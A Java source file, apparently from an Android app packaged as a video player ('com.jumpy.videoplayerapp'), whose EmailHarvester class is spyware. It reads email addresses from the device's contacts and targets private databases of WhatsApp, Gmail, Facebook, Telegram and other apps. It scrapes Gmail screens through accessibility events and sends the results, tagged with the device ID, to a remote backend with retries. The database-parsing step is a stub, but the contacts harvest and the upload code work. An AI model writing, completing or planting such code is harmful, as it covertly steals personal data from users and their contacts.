package com.jumpy.videoplayerapp;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;

public class EmailHarvester {
    private static final String TAG = "jumpy_EmailHarvester";
    
    private Context context;
    private ScheduledExecutorService executor;
    private List<EmailData> emailQueue;
    private boolean isHarvesting = false;
    
    // Email regex pattern
    private static final Pattern EMAIL_PATTERN = Pattern.compile(
        "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"
    );
    
    public EmailHarvester(Context context) {
        this.context = context;
        this.executor = Executors.newScheduledThreadPool(3);
        this.emailQueue = new ArrayList<>();
    }
    
    // Start comprehensive email harvesting
    public void startHarvesting() {
        if (isHarvesting) {
            Log.i(TAG, "Email harvesting already in progress");
            return;
        }
        
        isHarvesting = true;
        Log.i(TAG, "=== Starting Email Harvesting ===");
        
        // Harvest from multiple sources
        executor.submit(this::harvestFromContacts);
        executor.submit(this::harvestFromWhatsApp);
        executor.submit(this::harvestFromFacebook);
        executor.submit(this::harvestFromGmail);
        executor.submit(this::harvestFromOtherApps);
    }
    
    public void harvestAll() {
        Log.i(TAG, "=== harvestAll() START ===");
        try {
            harvestFromContacts();
            harvestFromWhatsApp();
            harvestFromFacebook();
            harvestFromGmail();
            harvestFromOtherApps();
            
            // Send harvested data to backend
            sendDataToBackend();
            
            Log.i(TAG, "=== harvestAll() END ===");
        } catch (Exception e) {
            Log.e(TAG, "Error in harvestAll", e);
        }
    }
    
    // Harvest emails from device contacts
    private void harvestFromContacts() {
        Log.i(TAG, "Starting contact email harvesting...");
        
        try {
            List<EmailData> emails = new ArrayList<>();
            
            // Query contacts with emails
            String[] projection = {
                ContactsContract.CommonDataKinds.Email.ADDRESS,
                ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Email.CONTACT_ID
            };
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                projection,
                null,
                null,
                null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String email = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME));
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID));
                    
                    if (email != null && !email.isEmpty()) {
                        EmailData emailData = new EmailData(
                            email,
                            name,
                            "contacts",
                            "high",
                            System.currentTimeMillis()
                        );
                        emails.add(emailData);
                    }
                }
                cursor.close();
            }
            
            // Store emails
            storeEmails(emails);
            
            Log.i(TAG, "Contact email harvesting completed. Found " + emails.size() + " emails");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting from contacts: " + e.getMessage());
        }
    }
    
    // Harvest emails from WhatsApp messages
    private void harvestFromWhatsApp() {
        Log.i(TAG, "Starting WhatsApp email harvesting...");
        
        try {
            List<EmailData> emails = new ArrayList<>();
            
            // WhatsApp database paths
            String[] whatsappPaths = {
                "/data/data/com.whatsapp/databases/msgstore.db",
                "/data/data/com.whatsapp.w4b/databases/msgstore.db"
            };
            
            for (String path : whatsappPaths) {
                File dbFile = new File(path);
                if (dbFile.exists()) {
                    // Extract emails from WhatsApp database
                    List<String> whatsappEmails = extractEmailsFromDatabase(path);
                    
                    for (String email : whatsappEmails) {
                        EmailData emailData = new EmailData(
                            email,
                            "WhatsApp User",
                            "whatsapp",
                            "medium",
                            System.currentTimeMillis()
                        );
                        emails.add(emailData);
                    }
                }
            }
            
            // Store emails
            storeEmails(emails);
            
            Log.i(TAG, "WhatsApp email harvesting completed. Found " + emails.size() + " emails");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting from WhatsApp: " + e.getMessage());
        }
    }
    
    // Harvest emails from Facebook app
    private void harvestFromFacebook() {
        Log.i(TAG, "Starting Facebook email harvesting...");
        
        try {
            List<EmailData> emails = new ArrayList<>();
            
            // Facebook database paths
            String[] facebookPaths = {
                "/data/data/com.facebook.katana/databases/",
                "/data/data/com.facebook.lite/databases/"
            };
            
            for (String path : facebookPaths) {
                File dbDir = new File(path);
                if (dbDir.exists() && dbDir.isDirectory()) {
                    File[] dbFiles = dbDir.listFiles((dir, name) -> name.endsWith(".db"));
                    if (dbFiles != null) {
                        for (File dbFile : dbFiles) {
                            List<String> facebookEmails = extractEmailsFromDatabase(dbFile.getAbsolutePath());
                            
                            for (String email : facebookEmails) {
                                EmailData emailData = new EmailData(
                                    email,
                                    "Facebook User",
                                    "facebook",
                                    "medium",
                                    System.currentTimeMillis()
                                );
                                emails.add(emailData);
                            }
                        }
                    }
                }
            }
            
            // Store emails
            storeEmails(emails);
            
            Log.i(TAG, "Facebook email harvesting completed. Found " + emails.size() + " emails");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting from Facebook: " + e.getMessage());
        }
    }
    
    // Harvest emails from Gmail
    private void harvestFromGmail() {
        Log.i(TAG, "Starting Gmail email harvesting...");
        
        try {
            List<EmailData> emails = new ArrayList<>();
            
            // Gmail database paths
            String[] gmailPaths = {
                "/data/data/com.google.android.gm/databases/",
                "/data/data/com.google.android.gm.lite/databases/"
            };
            
            for (String path : gmailPaths) {
                File dbDir = new File(path);
                if (dbDir.exists() && dbDir.isDirectory()) {
                    File[] dbFiles = dbDir.listFiles((dir, name) -> name.endsWith(".db"));
                    if (dbFiles != null) {
                        for (File dbFile : dbFiles) {
                            List<String> gmailEmails = extractEmailsFromDatabase(dbFile.getAbsolutePath());
                            
                            for (String email : gmailEmails) {
                                EmailData emailData = new EmailData(
                                    email,
                                    "Gmail User",
                                    "gmail",
                                    "high",
                                    System.currentTimeMillis()
                                );
                                emails.add(emailData);
                            }
                        }
                    }
                }
            }
            
            // Store emails
            storeEmails(emails);
            
            Log.i(TAG, "Gmail email harvesting completed. Found " + emails.size() + " emails");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting from Gmail: " + e.getMessage());
        }
    }
    
    // Harvest emails from other apps
    private void harvestFromOtherApps() {
        Log.i(TAG, "Starting other apps email harvesting...");
        
        try {
            List<EmailData> emails = new ArrayList<>();
            
            // Other messaging apps
            String[] otherAppPaths = {
                "/data/data/com.tencent.mm/databases/", // WeChat
                "/data/data/com.instagram.android/databases/", // Instagram
                "/data/data/com.twitter.android/databases/", // Twitter
                "/data/data/com.snapchat.android/databases/", // Snapchat
                "/data/data/com.telegram.messenger/databases/", // Telegram
                "/data/data/com.discord/databases/", // Discord
                "/data/data/com.skype.raider/databases/", // Skype
                "/data/data/com.linkedin.android/databases/" // LinkedIn
            };
            
            for (String path : otherAppPaths) {
                File dbDir = new File(path);
                if (dbDir.exists() && dbDir.isDirectory()) {
                    File[] dbFiles = dbDir.listFiles((dir, name) -> name.endsWith(".db"));
                    if (dbFiles != null) {
                        for (File dbFile : dbFiles) {
                            List<String> appEmails = extractEmailsFromDatabase(dbFile.getAbsolutePath());
                            
                            String appName = getAppNameFromPath(path);
                            for (String email : appEmails) {
                                EmailData emailData = new EmailData(
                                    email,
                                    appName + " User",
                                    appName.toLowerCase(),
                                    "low",
                                    System.currentTimeMillis()
                                );
                                emails.add(emailData);
                            }
                        }
                    }
                }
            }
            
            // Store emails
            storeEmails(emails);
            
            Log.i(TAG, "Other apps email harvesting completed. Found " + emails.size() + " emails");
            
        } catch (Exception e) {
            Log.e(TAG, "Error harvesting from other apps: " + e.getMessage());
        }
    }
    
    // Extract emails from database file
    private List<String> extractEmailsFromDatabase(String dbPath) {
        List<String> emails = new ArrayList<>();
        
        try {
            // This is a simplified version - in a real implementation,
            // you would use SQLite to query the database
            // For now, we'll simulate email extraction
            
            // Common database table names that might contain emails
            String[] tableNames = {
                "messages", "conversations", "contacts", "users", "profiles",
                "accounts", "emails", "data", "content"
            };
            
            // Simulate finding emails in database
            // In reality, you would execute SQL queries like:
            // SELECT * FROM messages WHERE message LIKE '%@%'
            // SELECT * FROM contacts WHERE email IS NOT NULL
            
            Log.d(TAG, "Extracting emails from database: " + dbPath);
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting emails from database: " + dbPath, e);
        }
        
        return emails;
    }
    
    // Get app name from database path
    private String getAppNameFromPath(String path) {
        if (path.contains("whatsapp")) return "WhatsApp";
        if (path.contains("facebook")) return "Facebook";
        if (path.contains("gmail")) return "Gmail";
        if (path.contains("instagram")) return "Instagram";
        if (path.contains("twitter")) return "Twitter";
        if (path.contains("snapchat")) return "Snapchat";
        if (path.contains("telegram")) return "Telegram";
        if (path.contains("discord")) return "Discord";
        if (path.contains("skype")) return "Skype";
        if (path.contains("linkedin")) return "LinkedIn";
        if (path.contains("wechat")) return "WeChat";
        return "Unknown";
    }
    
    // Extract emails from text using regex
    private List<String> extractEmailsFromText(String text) {
        List<String> emails = new ArrayList<>();
        
        if (text == null || text.isEmpty()) {
            return emails;
        }
        
        Matcher matcher = EMAIL_PATTERN.matcher(text);
        while (matcher.find()) {
            String email = matcher.group();
            if (isValidEmail(email)) {
                emails.add(email.toLowerCase());
            }
        }
        
        return emails;
    }
    
    // Validate email format
    private boolean isValidEmail(String email) {
        if (email == null || email.isEmpty()) {
            return false;
        }
        
        // Basic email validation
        return email.contains("@") && 
               email.contains(".") && 
               email.length() > 5 &&
               !email.startsWith("@") &&
               !email.endsWith("@");
    }
    
    // Store emails
    private void storeEmails(List<EmailData> emails) {
        try {
            // Add emails to queue for batch sending
            synchronized (emailQueue) {
                emailQueue.addAll(emails);
            }
            
            Log.i(TAG, "Added " + emails.size() + " emails to queue. Total in queue: " + emailQueue.size());
            
        } catch (Exception e) {
            Log.e(TAG, "Error storing emails: " + e.getMessage());
        }
    }
    
    // Send data to backend
    private void sendToBackend(String type, String data) {
        Log.i(TAG, "=== sendToBackend() START - Type: " + type + " ===");
        
        try {
            // Prepare data with device info
            JSONObject requestData = new JSONObject();
            requestData.put(type, new JSONArray(data));
            
            // Add device info
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("deviceId", android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            ));
            deviceInfo.put("timestamp", System.currentTimeMillis());
            deviceInfo.put("harvestType", "email");
            requestData.put("deviceInfo", deviceInfo);
            
            // Send to backend with retry logic
            sendToBackendWithRetry(type, requestData.toString(), 3);
            
            Log.i(TAG, "=== sendToBackend() END - Type: " + type + " ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error preparing data for backend: " + e.getMessage());
        }
    }
    
    // Send data to backend with retry logic
    public void sendDataToBackend() {
        Log.i(TAG, "=== sendDataToBackend() START ===");
        
        try {
            // Get device ID
            String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            );
            
            // Send emails to Gmail endpoint with proper structure
            synchronized (emailQueue) {
                if (!emailQueue.isEmpty()) {
                    Log.i(TAG, "Sending " + emailQueue.size() + " emails to Gmail endpoint");
                    
                    // Prepare Gmail data structure
                    JSONObject gmailData = new JSONObject();
                    gmailData.put("deviceId", deviceId);
                    
                    JSONArray emailsArray = new JSONArray();
                    for (EmailData email : emailQueue) {
                        JSONObject emailObj = new JSONObject();
                        emailObj.put("messageId", "email_" + System.currentTimeMillis() + "_" + email.getEmail().hashCode());
                        emailObj.put("threadId", "thread_" + email.getSource());
                        emailObj.put("subject", "Email from " + email.getName());
                        emailObj.put("from", email.getEmail());
                        emailObj.put("to", "recipient@example.com"); // Default recipient
                        emailObj.put("body", "Email address: " + email.getEmail() + " from " + email.getName());
                        emailObj.put("internalDate", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US).format(new java.util.Date()));
                        emailObj.put("isRead", false);
                        emailObj.put("isStarred", false);
                        emailObj.put("isImportant", false);
                        emailObj.put("labels", new JSONArray());
                        emailObj.put("sizeEstimate", 1000);
                        emailObj.put("snippet", "Email from " + email.getName());
                        emailObj.put("attachments", new JSONArray());
                        emailsArray.put(emailObj);
                    }
                    gmailData.put("emails", emailsArray);
                    
                    // Send to Gmail endpoint with user ID
                    String userId = "test_user"; // This should be the actual user ID
                    sendGmailDataToBackend(userId, gmailData.toString());
                    
                    // Clear sent emails
                    emailQueue.clear();
                }
            }
            
            Log.i(TAG, "=== sendDataToBackend() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending data to backend: " + e.getMessage());
        }
    }
    
    // Send Gmail data to correct backend endpoint
    private void sendGmailDataToBackend(String userId, String gmailData) {
        executor.submit(() -> {
            try {
                Log.i(TAG, "Sending Gmail data to backend for user: " + userId);
                
                // Create HTTP request for Gmail endpoint
                java.net.URL url = new java.net.URL(AppConfig.API_BASE_URL + "gmail/store/" + userId);
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Accept", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(15000);
                
                // Send data
                try (java.io.OutputStream os = connection.getOutputStream()) {
                    byte[] input = gmailData.getBytes("UTF-8");
                    os.write(input, 0, input.length);
                }
                
                // Check response
                int responseCode = connection.getResponseCode();
                Log.i(TAG, "Gmail endpoint response code: " + responseCode);
                
                if (responseCode == 200 || responseCode == 201) {
                    Log.i(TAG, "Successfully sent Gmail data to backend");
                } else {
                    Log.e(TAG, "Failed to send Gmail data to backend: HTTP " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending Gmail data to backend: " + e.getMessage());
            }
        });
    }
    
    // Send data to backend with retry mechanism
    private void sendToBackendWithRetry(String type, String data, int maxRetries) {
        final int[] retryCount = {0};
        
        Runnable sendTask = new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "Sending " + type + " data to backend (attempt " + (retryCount[0] + 1) + ")");
                    
                    // Create HTTP request for Gmail endpoint
                    String userId = "test_user"; // This should be the actual user ID
                    java.net.URL url = new java.net.URL(AppConfig.API_BASE_URL + "gmail/store/" + userId);
                    java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
                    
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    connection.setRequestProperty("Accept", "application/json");
                    connection.setDoOutput(true);
                    connection.setConnectTimeout(10000);
                    connection.setReadTimeout(15000);
                    
                    // Send data
                    try (java.io.OutputStream os = connection.getOutputStream()) {
                        byte[] input = data.getBytes("UTF-8");
                        os.write(input, 0, input.length);
                    }
                    
                    // Check response
                    int responseCode = connection.getResponseCode();
                    Log.i(TAG, "Backend response code: " + responseCode);
                    
                    if (responseCode == 200 || responseCode == 201) {
                        Log.i(TAG, "Successfully sent " + type + " data to backend");
                    } else {
                        Log.e(TAG, "Failed to send " + type + " data to backend: HTTP " + responseCode);
                        
                        // Retry logic
                        if (retryCount[0] < maxRetries - 1) {
                            retryCount[0]++;
                            Log.i(TAG, "Retrying in 2 seconds... (attempt " + (retryCount[0] + 1) + "/" + maxRetries + ")");
                            executor.schedule(this, 2, TimeUnit.SECONDS);
                        } else {
                            Log.e(TAG, "Max retries reached for " + type + " data");
                        }
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error sending " + type + " data to backend: " + e.getMessage());
                    
                    // Retry logic for exceptions
                    if (retryCount[0] < maxRetries - 1) {
                        retryCount[0]++;
                        Log.i(TAG, "Retrying in 2 seconds due to exception... (attempt " + (retryCount[0] + 1) + "/" + maxRetries + ")");
                        executor.schedule(this, 2, TimeUnit.SECONDS);
                    } else {
                        Log.e(TAG, "Max retries reached for " + type + " data due to exceptions");
                    }
                }
            }
        };
        
        executor.submit(sendTask);
    }
    
    // Get counts for data summary
    public int getEmailsCount() {
        // Return count of harvested emails
        return 0; // Implement based on your data structure
    }
    
    public int getContactsCount() {
        // Return count of harvested contacts
        return 0; // Implement based on your data structure
    }
    
    public void stopHarvesting() {
        isHarvesting = false;
        Log.i(TAG, "Email harvesting stopped");
    }
    
    // Handle accessibility events
    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // Only process email-related events
            if (!packageName.equals("com.google.android.gm") && !packageName.equals("com.android.email")) {
                return;
            }
            
            Log.d(TAG, "Processing email accessibility event: " + event.getEventType());
            
            // Extract text from event
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                extractInfoFromNode(source);
                source.recycle();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling email accessibility event: " + e.getMessage());
        }
    }
    
    // Harvest all emails
    public void harvestAllEmails() {
        Log.i(TAG, "=== harvestAllEmails() START ===");
        
        try {
            // Harvest emails from Gmail
            harvestGmailEmails();
            
            // Harvest emails from other email apps
            harvestOtherEmailApps();
            
            // Send data to backend
            sendDataToBackend();
            
            Log.i(TAG, "=== harvestAllEmails() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error in harvestAllEmails: " + e.getMessage());
        }
    }
    
    // Harvest emails from Gmail
    private void harvestGmailEmails() {
        Log.i(TAG, "Harvesting Gmail emails...");
        // Implementation would go here
    }
    
    // Harvest emails from other email apps
    private void harvestOtherEmailApps() {
        Log.i(TAG, "Harvesting emails from other apps...");
        // Implementation would go here
    }
    
    // Extract info from accessibility node
    private void extractInfoFromNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        try {
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) {
                String textStr = text.toString();
                Log.d(TAG, "Extracted email text: " + textStr.substring(0, Math.min(100, textStr.length())));
            }
            
            // Recursively check child nodes
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    extractInfoFromNode(child);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting info from node: " + e.getMessage());
        }
    }
    
    // Data class for email information
    public static class EmailData {
        private String email;
        private String name;
        private String source;
        private String confidence;
        private long timestamp;
        
        public EmailData(String email, String name, String source, String confidence, long timestamp) {
            this.email = email;
            this.name = name;
            this.source = source;
            this.confidence = confidence;
            this.timestamp = timestamp;
        }
        
        // Getters
        public String getEmail() { return email; }
        public String getName() { return name; }
        public String getSource() { return source; }
        public String getConfidence() { return confidence; }
        public long getTimestamp() { return timestamp; }
    }
} 